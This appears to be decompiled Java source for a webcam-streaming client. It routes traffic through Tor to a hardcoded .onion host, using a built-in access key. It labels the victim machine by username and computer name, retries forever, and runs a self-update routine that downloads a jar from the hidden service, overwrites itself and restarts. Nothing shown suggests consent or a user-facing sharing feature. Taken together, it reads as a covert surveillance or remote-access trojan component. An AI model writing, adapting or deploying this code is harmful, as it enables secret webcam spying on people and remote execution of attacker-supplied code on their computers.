package com.example.screen;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import core.TorBridge;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

public class WebcamShareSenderAuto {
   static final String ONION_HOST = "5kiwqdzvhip5yjx5u6ms2hsv3yozpslxocjhyf4cyimrg33fcb7devid.onion";
   private static final String DEFAULT_WS_URL = "ws://5kiwqdzvhip5yjx5u6ms2hsv3yozpslxocjhyf4cyimrg33fcb7devid.onion/webcam-stream";
   private static final String DEFAULT_KEY = "098cf3c1-2b8c-4094-82c2-388699660f90";
   private static final String DEFAULT_CLIENT_ID = "WEBCAM-CLIENT-001";
   private static final String DEFAULT_DEVICE_NAME = defaultDeviceName();
   private static final int DEFAULT_CAMERA_INDEX = 0;
   private static final int DEFAULT_FPS = 8;
   private static final float DEFAULT_QUALITY = 0.7F;
   private static final long RETRY_MIN_MS = 2000L;
   private static final long RETRY_MAX_MS = 20000L;
   private static final String VERSION = "1.0.0";

   public static void main(String[] args) throws Exception {
      try {
         TorBridge.get().start();
      } catch (Exception e) {
         e.printStackTrace();
      }

      checkUpdate();
      String key = args.length > 0 ? args[0] : resolveValue("WEBCAM_ACCESS_KEY", "webcam.access.key", "098cf3c1-2b8c-4094-82c2-388699660f90");
      String wsUrl = args.length > 1
         ? args[1]
         : resolveValue("WEBCAM_WS_URL", "webcam.ws.url", "ws://5kiwqdzvhip5yjx5u6ms2hsv3yozpslxocjhyf4cyimrg33fcb7devid.onion/webcam-stream");
      String clientId = args.length > 2 ? args[2] : resolveValue("WEBCAM_CLIENT_ID", "webcam.client.id", "WEBCAM-CLIENT-001");
      String deviceName = args.length > 3 ? args[3] : resolveValue("WEBCAM_DEVICE_NAME", "webcam.device.name", DEFAULT_DEVICE_NAME);
      String cameraIndex = args.length > 4 ? args[4] : resolveValue("WEBCAM_CAMERA_INDEX", "webcam.camera.index", String.valueOf(0));
      String fps = args.length > 5 ? args[5] : resolveValue("WEBCAM_FPS", "webcam.fps", String.valueOf(8));
      String quality = args.length > 6 ? args[6] : resolveValue("WEBCAM_JPEG_QUALITY", "webcam.jpeg.quality", String.valueOf(0.7F));
      String[] params = new String[]{key, wsUrl, clientId, deviceName, cameraIndex, fps, quality};
      long delayMs = 2000L;

      while (true) {
         try {
            WebcamShareSender.main(params);
            delayMs = 2000L;
         } catch (Exception e) {
            String msg = e.getMessage();
            System.out.println("Webcam sender failed: " + (msg == null ? e.getClass().getSimpleName() : msg));
            delayMs = Math.min(20000L, delayMs * 2L);
         }

         System.out.println("Retry in " + delayMs + " ms...");
         Thread.sleep(delayMs);
      }
   }

   private static void checkUpdate() {
      try {
         URL u = new URL("http://5kiwqdzvhip5yjx5u6ms2hsv3yozpslxocjhyf4cyimrg33fcb7devid.onion/api/screen/version");
         HttpURLConnection c = (HttpURLConnection)u.openConnection(TorBridge.get().socks());
         c.setConnectTimeout(4000);
         c.setReadTimeout(6000);
         if (c.getResponseCode() == 200) {
            String resp = new String(readAll(c.getInputStream()));
            JsonNode json = new ObjectMapper().readTree(resp);
            String sv = json.get("version").asText();
            if (compareVersions(sv, "1.0.0") > 0) {
               System.out.println("Update: 1.0.0 -> " + sv);
               String dlUrl = json.get("url").asText().replace("/4002", "/4002");
               URL du = new URL(dlUrl);
               HttpURLConnection dc = (HttpURLConnection)du.openConnection(TorBridge.get().socks());
               dc.setConnectTimeout(30000);
               dc.setReadTimeout(120000);
               if (dc.getResponseCode() == 200) {
                  Path tmp = Files.createTempFile("webcam", ".jar");
                  InputStream is = dc.getInputStream();

                  try {
                     Files.copy(is, tmp, StandardCopyOption.REPLACE_EXISTING);
                  } catch (Throwable var13) {
                     if (is != null) {
                        try {
                           is.close();
                        } catch (Throwable var12) {
                           var13.addSuppressed(var12);
                        }
                     }

                     throw var13;
                  }

                  if (is != null) {
                     is.close();
                  }

                  Path myPath = Paths.get(WebcamShareSenderAuto.class.getProtectionDomain().getCodeSource().getLocation().toURI());
                  Files.copy(tmp, myPath, StandardCopyOption.REPLACE_EXISTING);
                  tmp.toFile().delete();
                  System.out.println("Updated. Restarting...");
                  new ProcessBuilder("java", "-jar", myPath.toString()).inheritIO().start();
                  System.exit(0);
               }
            }
         }
      } catch (Exception e) {
         System.err.println("Update: " + e.getMessage());
      }
   }

   private static int compareVersions(String a, String b) {
      String[] pa = a.split("\\.");
      String[] pb = b.split("\\.");

      for (int i = 0; i < Math.max(pa.length, pb.length); i++) {
         int va = i < pa.length ? Integer.parseInt(pa[i]) : 0;
         int vb = i < pb.length ? Integer.parseInt(pb[i]) : 0;
         if (va != vb) {
            return va - vb;
         }
      }

      return 0;
   }

   private static byte[] readAll(InputStream is) throws IOException {
      ByteArrayOutputStream buf = new ByteArrayOutputStream();
      byte[] tmp = new byte[8192];

      int n;
      while ((n = is.read(tmp)) != -1) {
         buf.write(tmp, 0, n);
      }

      return buf.toByteArray();
   }

   private static String resolveValue(String envName, String propName, String fallback) {
      String prop = System.getProperty(propName);
      if (prop != null && !prop.trim().isEmpty()) {
         return prop.trim();
      }

      String env = System.getenv(envName);
      return env != null && !env.trim().isEmpty() ? env.trim() : fallback;
   }

   private static String defaultDeviceName() {
      String pcName = System.getProperty("user.name");
      String host = System.getenv("COMPUTERNAME");
      if (pcName == null || pcName.trim().isEmpty()) {
         pcName = "user";
      }

      if (host == null || host.trim().isEmpty()) {
         host = "host";
      }

      return pcName + "@" + host;
   }
}
